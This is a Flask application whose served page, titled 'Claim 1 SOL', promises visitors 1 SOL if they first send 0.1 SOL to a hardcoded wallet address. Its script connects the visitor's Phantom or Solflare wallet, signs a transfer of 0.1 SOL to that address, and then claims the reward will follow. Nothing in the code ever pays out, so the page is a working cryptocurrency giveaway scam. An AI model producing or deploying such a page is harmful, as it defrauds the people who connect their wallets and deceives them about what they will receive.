from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Claim 1 SOL</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    button {
      background: #00ff99;
      border: none;
      padding: 12px 24px;
      margin: 10px;
      border-radius: 8px;
      font-weight: bold;
      font-size: 1.1em;
      cursor: pointer;
      color: black;
    }
    img.qr {
      width: 200px;
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>
  <h1>Claim 1 SOL</h1>
  <p>To receive 1 SOL, send exactly <strong>0.1 SOL</strong> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
  <p id="status">Wallet not connected</p>

  <button onclick="connectWallet()">Connect Wallet</button>
  <button onclick="connectPhantom()">Connect Phantom Only</button>
  <br>
  <button onclick="sendTransaction()" id="sendBtn" disabled>Send 0.1 SOL</button>

  <script type="module">
    import {
      Connection,
      PublicKey,
      SystemProgram,
      Transaction
    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";

    let provider = null;
    let publicKey = null;

    async function connectWallet() {
      if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
        try {
          const resp = await window.solana.connect();
          provider = window.solana;
          publicKey = resp.publicKey;
          document.getElementById('status').innerText = "Connected: " + publicKey.toString();
          document.getElementById('sendBtn').disabled = false;
        } catch (err) {
          console.error("Connection rejected:", err);
        }
      } else {
        alert("Solana wallet not found. Try opening in Phantom or Solflare browser.");
        document.getElementById("qrCode").style.display = "block";
      }
    }

    async function connectPhantom() {
      if (window.solana && window.solana.isPhantom) {
        try {
          const resp = await window.solana.connect();
          provider = window.solana;
          publicKey = resp.publicKey;
          document.getElementById('status').innerText = "Connected (Phantom): " + publicKey.toString();
          document.getElementById('sendBtn').disabled = false;
        } catch (err) {
          console.error("User rejected Phantom connection:", err);
        }
      } else {
        alert("Phantom wallet not found. Open in Phantom mobile browser.");
      }
    }

    async function sendTransaction() {
      if (!provider || !publicKey) {
        alert("Please connect your wallet first.");
        return;
      }

      const connection = new Connection("https://api.mainnet-beta.solana.com");
      const receiver = new PublicKey("{{ wallet }}");

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: receiver,
          lamports: 0.1 * 1e9, // 0.1 SOL
        })
      );

      try {
        const { signature } = await provider.signAndSendTransaction(transaction);
        await connection.confirmTransaction(signature);
        alert("✅ 0.1 SOL sent! You will receive 1 SOL soon.");
      } catch (e) {
        console.error(e);
        alert("❌ Transaction failed: " + e.message);
      }
    }

    window.connectWallet = connectWallet;
    window.connectPhantom = connectPhantom;
    window.sendTransaction = sendTransaction;
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
